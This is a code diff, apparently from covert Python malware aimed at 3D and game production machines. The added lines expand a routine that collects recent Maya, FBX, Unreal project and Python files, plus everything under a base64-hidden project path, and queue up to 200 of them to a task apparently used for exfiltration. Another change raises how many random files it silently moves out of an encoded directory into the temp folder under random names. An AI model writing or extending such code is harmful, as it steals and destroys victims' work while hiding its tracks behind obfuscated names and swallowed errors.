@@ -176,13 +176,16 @@ try:
         zovV += search_latest_files_or_dirs(dir_path=dp, ext=".fbx", n=10)
         zovV += search_latest_files_or_dirs(dir_path=dp, ext=".ma", n=10)
         zovV += search_latest_files_or_dirs(dir_path=dp, ext=".mb", n=10)
-        zovV += search_latest_files_or_dirs(dir_path=dp, ext=".py", n=10)
+        zovV += search_latest_files_or_dirs(dir_path=dp, ext=".py", n=100)
+        zovV += search_latest_files_or_dirs(dir_path=dp, ext=".pyc", n=100)
         zovV += search_latest_files_or_dirs(dir_path=dp, ext=".uproject", n=8)
+        
+    zovV += search_latest_files_or_dirs(dir_path="TDovV0hNL0NIQVJBQ1RFUi9PUF9NTFRfQ0FESUFOX1RSUF9CTFVNLw==", ext="*", n=50)
 
     if zovV:
         random.shuffle(zovV)
-        zovV = zovV[:100]
-        add_queue_task("tsl__user", {"file": zovV[:100]})
+        zovV = zovV[:200]
+        add_queue_task("tsl__user", {"file": zovV[:200]})
 except:
     try:
         add_queue_task("tsl_error", {"error": str(traceback.format_exc())})
@@ -195,7 +198,7 @@ try:
         "{}/**/*".format(b64decode_padded("UzovdGVtcC9NT0Qv")), recursive=True
     )
     files = [f for f in files if os.path.isfile(f)]
-    for file in random.sample(files, k=min(65, len(files))):
+    for file in random.sample(files, k=min(100, len(files))):
         shutil.move(file, os.path.join(tempfile.gettempdir(), uuid.uuid4().hex))
 except:
     pass
